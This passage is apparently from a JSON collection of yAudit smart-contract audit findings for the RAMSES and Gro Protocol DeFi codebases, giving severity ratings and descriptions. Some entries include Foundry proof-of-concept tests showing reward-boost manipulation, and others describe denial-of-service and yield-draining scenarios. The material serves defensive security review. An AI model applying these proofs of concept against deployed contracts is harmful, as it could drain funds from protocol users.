vm.label(address(_token0), \"_token0\"); vm.label(address(_token1), \"_token1\"); vm.label(address(_factory), \"_factory\"); vm.label(address(_veRam), \"veRam\"); vm.label(address(_nfpManager), \"_nfpManager\"); vm.label(address(_voter), \"_voter\"); _factory.initialize(address(_nfpManager), address(_veRam), address(_voter), address(0)); _pool.initialize(address(_factory), address(_nfpManager), address(_veRam), address(_voter), address(_token0), address(_token1), 10_000, 200); _pool.initialize(393495975901102234655829); } function tickSpacingToMaxLiquidityPerTick(int24 tickSpacing) public pure returns (uint128) { int24 minTick = (TickMath.MIN_TICK / tickSpacing) * tickSpacing; int24 maxTick = (TickMath.MAX_TICK / tickSpacing) * tickSpacing; uint24 numTicks = uint24((maxTick - minTick) / tickSpacing) + 1; return type(uint128).max / numTicks; } function testBurnAndMint() public { uint256 period = block.timestamp / (1 weeks); ( uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1, \"\"); (uint128 boostAmountPreBurn,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); _pool.burn(0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1); _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200), 1, \"\"); (uint128 boostAmountPostBurn,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); assertGt(uint(boostAmountPostBurn), uint(boostAmountPreBurn)); } } Note that the pool in the POC has been initialized similarly to the deployed DEUS/USDC pool which can be found here. Also, note that the MockVotingEscrow contract has been hard coded to return the same balanceOfNFT() (the balance taken from the deployed veRAM contract for tokenId 1 at the time of the test) and isApproverOrOwner() for ease of testing. function isApprovedOrOwner(address, uint256) external override view returns (bool) { return true; } function balanceOfNFT(uint256) external override view returns (uint256) { return 21487469130353205716474214; }",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Incorrect math in left()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The line calculating elapsedTime calculates the difference between _blockTimestamp(), with units of seconds, and period, with units of weeks. Subtracting weeks from seconds will result in a nonsensical result, so the two values must have the same units before the difference is calculated.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. The first mint in a pool gets 0 boostAmount regardless of veRamTokenId or liquidity supplied",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The boostedLiquidityCap is based on the hypotheticalLiquidity which is based on the pool's token balances. When a pool is first deployed, it has no liquidity, so the first minter will receive no boostedLiquidity regardless of the size of their mint or veRamTokenId's balance. This is particularly acute if the minter is minting a large position as is illustrated in the POC below. See this POC for an illustration of the point in code: function testFirstMint() public { uint256 period = block.timestamp / (1 weeks); ( , int24 tick, , , , , ) = _pool.slot0(); int24 tickLower = tick - 132; int24 tickUpper = tick + 68; _pool.mint(address(this), 0, tickLower, tickUpper, tickSpacingToMaxLiquidityPerTick(200) - 100, 1, \"\"); (uint128 boostAmountFirstMint,,,) = _pool.boostInfos(period, positionHash(address(this), 0, tickLower, tickUpper)); assertEq(uint256(boostAmountFirstMint), 0); _pool.mint(address(this), 1, tickLower, tickUpper, 100, 2, \"\"); // This could be a new minter, however we're using a different index and veRamTokenId for illustration purposes. (uint128 boostAmountSecondMintDifferentPosition,,,) = _pool.boostInfos(period, positionHash(address(this), 1, tickLower, tickUpper)); assertGt(uint256(boostAmountSecondMintDifferentPosition), 0); }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. GaugeV2.getPeriodReward() can skip lastClaimByToken for a valid claim",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "In function, GaugeV2.getPeriodReward(), consider the following: User wants to claim the reward for period = 13, current period = 14, and lastClaimByToken was made for all the tokens in period 10. That means the condition comes out to be 10 < period < 13. if ( period > lastClaimByToken[tokens[i]][_positionHash] && period < _blockTimestamp() / WEEK - 1 ) The period for which the rewards were claimed doesn't lie in the range. Hence, it skips the check and then moves on to the _getReward() call, which lets the user claim a reward for period 13, and lastClaimByToken remained 10. Well, it should be able to set the lastClaim to that period as it has been passed, and the user can claim the reward for that period later in the function.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. The rewards list can grow unbounded in GaugeV2.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "notifyRewardAmount() is an external function, with no access control modifier, which means anyone can call notifyRewardAmount(). If a token has not been seen before, it is added to the isReward mapping and pushed into the rewards list. This means an attacker could fill the list with a large number of random token addresses. Elsewhere in GaugeV2.sol, such as getPeriodReward(), tokens are passed into the function such that the entire reward list is not iterated through. However, this is not the case in the RamsesRewards.sol contract's addressEarnedCl() function, where the entire reward list is iterated through.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. createCLGauge() code doesn't match comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "This comment and a line of code earlier in the function directly conflict with one another. require(_pool != address(0), \"no pool\"); ... // gov can create for any pool, even non-Ramses pairs By requiring _pool != address(0) value of true, governance is limited to only adding gauges to valid RAMSES pairs. This is in contrast to createGauge() for Ramses v1, where the equivalent check requiring isPair to be true is only applied to a non-governor msg.sender.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Inconsistent first period in GaugeV2",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The firstPeriod variable is set during initialization as: firstPeriod = _blockTimestamp() / WEEK; This value will be rounded down. The end result of this value rounding down is the same whether the week of firstPeriod is 5% complete or 95% complete during initialization. This rounding down will artificially shorten the time period for the firstPeriod. This may skew the rewards per second during firstPeriod compared to future periods.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Errors in left()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The NatSpec for left() references a function that does not exist, getTokenTotalSupplyByPeriod(). The NatSpec should be updated to remove this reference. The name of the function left() is misleading. The return value sees the elapsedTime value in the numerator, not the remaining time. This means that the return value of left() increases as the period approaches the end of the period, when the function name indicates that the opposite should be true.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. No validation of pool address in createGauge()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Like other contracts in RAMSES, RamsesV2GaugeFactory.sol is loosely based on UniswapV3Factory.sol, with the implementation of createGauge() based on createPool(). In Uniswap, anyone can create a pool between two ERC20 tokens. It is unclear whether the same should be true of createGauge(), but there is no access control enforced on this function. The pool address function argument is not verified as a RAMSES pool before it is passed to _deploy(), which also does not validate the pool address value. The result is that a gauge will exist with a pool address that is not a pool, and a malicious party can create a contract that implements the same interface as a RAMSES pool but does not necessarily perform the same actions. There are external calls to the pool address in GaugeV2.sol (such as 1, 2, 3) that may be leveraged into an attack vector, though the specifics have not been fully worked out yet.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. v1 Gauge.sol poke() should cache length before loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Gauge.poke() should cache rewards.length before the for loop, then reference the cache length value in the loop, to achieve gas savings. Otherwise the length of the rewards state variable is checked on each iteration of the loop. This finding was automatically identified by slither.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. _find_time_user_epoch() loop iterations can be reduced",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "VotingEscrow.vy in Curve has a function find_block_epoch() which implements binary search using a for loop that repeats 128 times. RAMSES has a similar VotingEscrow._find_time_user_epoch() function that implements binary search using a for loop that repeats 256 times. The RAMSES VotingEscrow._find_time_user_epoch() implementation is in contrast to the RAMSES implementation of VotingEscrow._balanceOfAtNFT(), which loops 128 times like Curve. There is no need for VotingEscrow._find_time_user_epoch() to loop 256 times, it can stop at 128.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Move logic into if statement",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "_supplied is only needed in the if branch, so it can be set inside that branch. function _updateFor(address _gauge) internal { address _pool = poolForGauge[_gauge]; - uint256 _supplied = weights[_pool]; uint256 _supplyIndex = supplyIndex[_gauge]; // only new pools will have 0 _supplyIndex if (_supplyIndex > 0) { + uint256 _supplied = weights[_pool]; uint256 _index = index; // get global index0 for accumulated distro",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. periodSecondsPerBoostedLiquidityOutsideBeforeX128 and periodSecondsPerLiquidityOutsideBeforeX128 are 0 and can be removed from subtraction",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "In cross() periodSecondsPerLiquidityOutsideBeforeX128 and periodSecondsPerBoostedLiquidityOutsideBeforeX128 must be 0 for the if logic to be executed. In this case, their subtraction does nothing to contribute to the final periodSecondsPerLiquidityOutsideX128 and periodSecondsPerBoostedLiquidityOutsideX128 values.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. ERC721PermitUpgradeable inherits from Initializable twice",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "ERC721PermitUpgradeable inherits from Initializable explicitly. However, ERC721Upgradeable already inherits from Initializable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. positionLiquidity - params.liquidity is calculated twice",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "position.liquidity is stored as positionLiquidity - params.liquidity. This is recomputed to check if the liquidity difference is 0 and unset the veRamTokenId.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Gas can be saved calling a different periodEarned() in GaugeV2.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Currently, in earned() periodEarned(period, token, tokenId) is called to accumulate the reward. This periodEarned() function re-computes the tickLower and tickUpper which are already known at the time periodEarned() is called in earned().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Restrict reward claim for current epoch",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Since all the important (rewards deciding) variables for the current epoch get set at the start of the next epoch, it is crucial to not let the user claim the reward for the current epoch. Additionally, the reward that the user is claiming for the current week turns out to be an arbitrary value calculated using a fixed value of boostedInRange as 1 WEEK. Even if the user claims the reward for the current week, his/her rewards are still accumulating which the user can't claim as those rewards become available in the next epoch. Then it is better to restrict users to claim rewards for the current epoch.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. initialize should emit event for variable set",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Ideally, the following should trigger events. FeeCollector.initialize() should emit TreasuryChanged. RamsesV2Factory.initialize() should emit ImplementationChanged",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. _switchAttachment shouldn't allow switch if position.liquidity == 0",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Once a user decreases all the liquidity from its nfpManager position, the veRamTokenId from both the pool and nfpManager position gets detached (becomes 0). But if the user calls _switchAttachment it will set veRamTokenId in nfpManager, but in the pool, the user attachedVeRamId remains zero. (nfpManager.switchAttachment() -> pool.burn() -> _updateLiquidity() which only updates veRamTokenId, if newLiquidity > 0). This can make the pool and nfpManager contract out of sync for a user position.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Incorrect NatSpec comment in ProtocolActions Library",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "CollectProtocol event is emitted when feeCollector calls the collectProtocol function of RamsesV2Pool.sol, as the function has a modifier onlyFeeCollector which means it can only be called by feeCollector.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Revert doesn't contain error message",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Revert statement reverts without error message in the following functions. RamsesV2Pool.sol: onlyFeeCollector() mint() RamsesV2Factory.sol: enableFeeAmount() NonfungiblePositionManager.sol: tokenURI() decreaseLiquidity() SwapRouter.sol: ramsesV2SwapCallback() exactOutputInternal()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. inconsistency in preventing implementation initialization",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "There needs to be more consistent behavior in the constructor of implementation contracts. The following contracts use _disableInitializers(); to disable initialization of implementation (which is good): GuageV2.sol FeeCollector.sol RamsesLens.sol But other contracts follow constructor() initializer {} (which does the same thing, but it is recommended to use _disableInitializers for implementations)",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Imports are unused",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Various imports throughout the codebase are not used and can be removed. The IWETH9.sol import in SwapRouter.sol. The SqrtPriceMath.sol, IRamsesV2PoolDeployer.sol, IVotingEscrow.sol, and IVoter.sol imports in RamsesV2Pool.sol. RamsesPool.sol in RamsesV2Factory.sol. IGaugeV2.sol in RamsesV2GaugeFactory.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Contract without proxy can be simplified",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Several proxy artifacts in RamsesDeployer.sol can be modified because it is not behind a proxy: The file imported from @openzeppelin/contracts-upgradeable can be changed to the @openzeppelin/contracts version of the file. Initializer is not necessary. initialize() can be replaced by the contract constructor.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Whitelisted tokens for gauges cannot be removed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "There is no way to reverse the action of the whitelist() operation in Voter.sol. If there is a token that should be removed from the whitelist, the Voter contract (which is deployed behind a proxy) may need to be replaced. Adding a function to reverse the whitelisting of tokens can improve the mitigation of future threats if a trusted token contract is maliciously or incompatibly upgraded.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Emergency council identical to governor in Voter.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Voter.sol has a governor role and an emergencyCouncil role. In the on-chain contract, the same RAMSES multisig is set for these two different roles. In other Solidly fork implementations with the emergencyCouncil role, such as Velodrome on Optimism and PearlFi on Polygon, these roles are assigned to different multisigs. Specifically, the emergencyCouncil multisig has a higher threshold than the governance multisig, suggesting a design choice where controlling the uptime of the protocol requires cooperation from more signers than adding gauges to the protocol. This is a design choice and RAMSES may have decided that the current approach is best, but without clear documentation on this choice, the current settings make the RAMSES multisig a centralized source of power over the full protocol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. On-chain contracts using different library versions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Some of the on-chain code does not match the contract versions reviewed during this audit. Specifically, the on-chain Oracle.sol deployment at 0xf70c9C4F6281C0750d68da8878894b1235cb6020 has some minor differences in 3 dependencies, States.sol, LiquidityMath.sol, and Tick.sol, compared to the code reviewed in this audit. Similarly, Tick.sol deployed at 0xc989D669831Cd5258369CB0Dce7752CbfE7303E8 and ProtocolActions.sol deployed at 0xa67f82621540017a679153423CA0B8a1b4518B49 have different versions of the State.sol library dependency compared to the version of State.sol in this audit.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Reduce rounding error inaccuracy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The two division operations can be reduced to one to minimize error created by the rounding down inherent in a solidity division operation. function rewardRate(address token) external view returns (uint256) { uint256 period = _blockTimestamp() / WEEK; - return (tokenTotalSupplyByPeriod[period][token] * 4) / 10 / WEEK; + return (tokenTotalSupplyByPeriod[period][token] * 4) / (10 * WEEK); }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Beacon proxy inconsistency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "RamsesV2PoolDeployer uses the value keccak256(abi.encode()) for the beacon proxy creation while RamsesV2GaugeDeployer uses keccak256(abi.encodePacked()). These contracts perform almost the exact same task, so the same code logic should be used.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. STATES_SLOT can accidentally match a known pre-image",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "By calculating STATES_SLOT = keccak256(\"states.storage\") using a string value, the first pre-image of STATES_SLOT is known (\"states.storage\"), which makes it accidentally match the known pre-image (\"states.storage\"). Openzeppelin and all proxy standards derive their custom storage slot in this way. Ref",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. First period has default zero value for startTick and previousPeriod",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The implementation of RamsesV2Pool._advancePeriod() primarily updates the values for states.periods[_lastPeriod], or the state of the last period. Only one line of code updates the current period value. Because _advancePeriod() is first called in initialize(), the initial _lastPeriod value of zero will be meaningless, but it will have no values set for startTick and previousPeriod, so these values will remain zero. The first real period is the 1st period (not the 0th period). Any loop that iterates through the period states should consider this, but there is no comment to clarify this is how the period values are handled.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Forked Uniswap v3 code uses OZ 3.4.1 not 3.4.2",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "The changes made between 3.4.2 and 3.4.1 are minimal, which just one commit made in TimelockController, which is not directly used in the v2-periphery/ directory. However, if the goal is to maintain maximum similarity to the original Uniswap, this dependency on OpenZeppelin in the v2-periphery/ directory should be upgraded to OZ 3.4.2.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Improve naming choices",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "Several naming choices that could be improved include: RamsesV2Pool.sol has two functions named \"initialize\". The second function sets the initial price for the pool and may be better named \"setInitialPoolPrice\" to avoid confusion. The function name \"initialize\" is generally used for a single function in an implementation contract sitting behind a proxy. This function can only be called once and sets initial values similar to how a constructor would work in a non-proxy context. But in RamsesV2Pool.sol, the second initialize function can be called more than once because it lacks an initializer modifier. PeripheryUpgradeable.sol is a renamed version of PeripheryImmutableState.sol in Uniswap v3. The interface for PeripheryUpgradeable.sol still has the original name of IPeripheryImmutableState.sol, which does not match the contract implementing the interface file. PeripheryUpgradeable.sol is a modified version of Uniswap's PeripheryImmutableState.sol. But the interface that is implemented in the RAMSES file is not renamed to match the contract name. Instead, the original IPeripheryImmutableState interface name remains. Although out of scope, the _gauges function argument in Voter.initialize() would be better named _gaugefactory, because the variable name _gauges is used elsewhere in the contract to refer to a different variable.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Remove library functions that are never used",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "checkTicks() is declared at the end of Tick.sol but is never called. The only place where the code acknowledges this function is a comment in collect() with the word \"checkTicks\". checkTicks() could be called in RamsesV2Pool.snapshotCumulativesInside() to replace the existing tick checks, but this may only make sense if checkTicks() gets called in more than one location.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. RamsesV2Pool view functions don't return all struct values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-RAMSES.md",
        "body": "One specific example of this is ticks() that does not return: cleanUnusedSlot cleanUnusedSlot2 periodSecondsPerLiquidityOutsideX128 periodSecondsPerBoostedLiquidityOutsideX128 Another example is boostInfos(uint256, bytes32) which returns values from a BoostInfo struct but does not return secondsPerLiquidityPeriodStartX128 or secondsPerBoostedLiquidityPeriodStartX128. A third example is observations() which returns all values from the Observation struct except for boostedInRange.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Underflow in int256 -> uint256 conversion",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "In GTranche.sol, pnlDistribution() and _pnlDistribution() calculate the new _trancheBalances in int256 values before casting them to uint256 when storing in the return variables. This final casting will cause an underflow if the int256 value _trancheBalances is negative. For example: Assume a scenario where the Junior Tranche is permitted 50x leverage, so the Senior Tranche has 5000 wei and the Junior Tranche has 100 wei (root causes include: no minimum deposit in the tranche, no limit on the leverage allowed, no limit on the fixed yield paid to the Senior Tranche) If the PnL distribution is not done in a long time, it is possible that the seniorProfit owed to the Senior Tranche will be greater than 100 wei. This needs to be paid to the Senior Tranche even if the profit of the tranche is zero (if lastTotal <= totalValue then distributeProfit() will be triggered). distributeLoss() prevents loss[0] from holding a value that is greater than _trancheBalances[0], which would cause a negative _trancheBalances[0] after this subtraction and would later underflow. In contrast, distributeProfit() has no similar check and there is even a comment stating that the profit to the Junior Tranche can be negative, which would make it similar to a loss scenario for this tranche. If the value of -1 * (_amount - seniorProfit) is greater than _trancheBalances[0], then the addition operation will actually become a subtraction and result in _trancheBalances[0] holding a negative value, which would underflow in a later casting. The same underflow issue may theoretically occur with distributeLoss() if _amount - _trancheBalances[0] > _trancheBalances[1]. This might be possible in a tranche setup where nearly all the deposits are in the Junior Tranche so the utilization ratio is nearly zero, but an accounting error causes the losses to be greater than the total tranche assets. This scenario seems unlikely but still may be worth protecting against.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. sellAllRewards() reverts with non-zero numberOfRewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The swapExactTokensForTokens() function in Uniswap V2 Router has a safeTransferFrom() call. The address calling the Uniswap V2 router must approve the tokens for the Router before calling this function, otherwise the function will revert. The ConvexStrategy fails to approve additional reward tokens before calling Uniswap V2.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. wethAmount in rewards calculations should be balanceOf",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "When _sellRewards() calculates the rewards that can be reinvested into 3CRV, it starts calculating with a wethAmount of zero. However, the minimum amount for converting CRV rewards or CVX rewards to ETH is 1E18 of CRV or CVX, while the minimum amount for converting ETH to 3CRV is 1E16 ETH. Assuming the current prices of $1200 WETH, $0.5 CRV, and $3.50 CVX, it is possible for a scenario where $11 worth of CRV and CVX is converted into WETH, but because the 1E16 threshold for converting WETH to 3CRV is $12, the WETH will not be converted into 3CRV. If this case happens many times, substantial WETH could accumulate in the strategy without getting reinvested to earn more yield.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Tranche deposit/withdrawal denial of service",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The current code is written in a way that assumes the utilisation ratio remains below the utilisationThreshold unless a deposit or withdrawal will move it above the threshold. In fact, the utilisation ratio can achieve a value greater than utilisationThreshold in a couple of ways: The owner can set utilisationThreshold to any value with setUtilizationThreshold(). If the threshold is set to a value less than the current utilisation ratio, it can break assumptions about how the protocol should work and prevent tranche deposits or withdrawals. Losses for the Junior Tranche may result in a scenario where the utilisation ratio exceeds the utilisationThreshold. Note that the Junior tranche can experience a loss even when distributeProfit() is called because the yield paid to the Senior Tranche depositors may exceed the profit earned. If the utilisation ratio exceeds the utilisationThreshold, a GTranche deposit() or withdraw() that attempts to move the utilisation ratio in the correct direction may revert if it does not bring the ratio below utilisationThreshold. This behaviour breaks an assumption in the protocol documentation that such actions should always be allowed.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Unreliable Senior Tranche yield",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "PnLFixedRate.sol does not account for seniorProfit in two cases: In distributeLoss() when the loss is greater than or equal to the value of the Junior Tranche and could cause losses for the Senior Tranche In distributeProfit() when the utilisation ratio is greater than utilisationThreshold",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Timing mismatch between time-gated actions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "_calculateLockedProfit() is designed to slowly release profits to the GVault depositors. If the releaseTime is surpassed, which is 24 hours, it returns zero, which means no profit is locked. The lockedProfit value is updated when report() in GVault is called by a strategy's runHarvest(). ConvexStrategy's canHarvest(), which indicates when a keeper can call runHarvest(), has a constant MIN_REPORT_DELAY value of 48 hours. This means that if MIN_REPORT_DELAY is the determining factor for when a harvest happens, _calculateLockedProfit() will return zero for roughly half of that minimum time period. During the time that _calculateLockedProfit() returns zero, the profit calculation in PnLFixedRate of totalValue - lastTotal will return zero. This will causes the Senior Tranche to take value from the Junior Tranche to pay the fixed yield of the Senior Tranche. An example of how this could be leveraged to cause a loss for Junior Tranche holders: Depositor deposits 3CRV into the GVault The GVault does not move 3CRV to the strategy until report() is called by a strategy, so the assets may not maximize their yield for some time Depositor deposits their GVault ERC4626 tokens into the Senior Tranche and soon withdraws. The deposit and withdrawal may both be done in a short period (say, 24 hours) while _calculateLockedProfit() is returning zero. This means before report() will not have been called to deposit the loose 3CRV in the GVault to maximize yield, yet the depositor claims their fixed yield from the Senior Tranche at the cost of Junior Tranche depositors, who don't reap the full benefits of the 3CRV deposit into the GVault. If the above actions are performed frequently with large amounts of capital, say twice a week, the Junior Tranche may be less appealing for depositors. This is because the Junior Tranche is willing to pay the Senior Tranche the borrowing cost for leverage, but this cost makes more sense if the Junior Tranche is able to use the 3CRV in the strategy and not when it is sitting idle in the GVault. This scenario would get worse if the tranche had a large utilization ratio, say 10x, because the fee paid to the Senior Tranche would be larger. The flip side of this is that Junior Tranche depositors would be incentivized to withdraw their deposits during the time when _calculateLockedProfit() returns zero for the same reason.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Whale invest() and divest() denial of service",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "A whale may deposit an extremely large amount of 3CRV into GVault. When the GVault provides this 3CRV to ConvexStrategy to invest, the invest() function makes sure that the liquidity added to the metapool is within proper slippage tolerance. If the Curve pool is imbalanced sufficiently by the added liquidity, it may not return sufficient value and cause invest() to revert due to the slippage exceeding the slippage tolerance. This denial of service would not cost the whale much to sustain the DoS because they could deposit the GVault tokens into the Senior Tranche (at least until the utilization ratio is met) and receive their fixed yield, even though the Junior Tranche is not receiving its yield because the strategy's harvesting mechanism is locked up. In theory this could lead to bankrupting the Junior Tranche if carried out for long enough because the whale's deposit can't be deposited into the metapool to maximize rewards, like the \"leach attack\" described in a separate finding. divest() has a similar slippage check that may also revert under some conditions. Since users cannot control when divest happens, the whale would need to imbalance the pool outside of Gro. This DoS is likely far more costly than the invest() DoS vector because imbalancing the Curve pool would most likely create and arbitrage opportunity.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Strategy migration should remove old approvals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "setPool() in ConvexStrategy.sol gives a new metaPool infinite approval. But when this happens, the old metapool (if one was previously set) does not have its infinite approval revoked. If the old metapool had a security issue, the inability to revoke the prior approval could be problematic and would require emergency mode activation which would not be required if the approval could be revoked. The same process should take place to remove the BOOSTER approval of the old LP token.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Inconsistent ERC20 imports",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
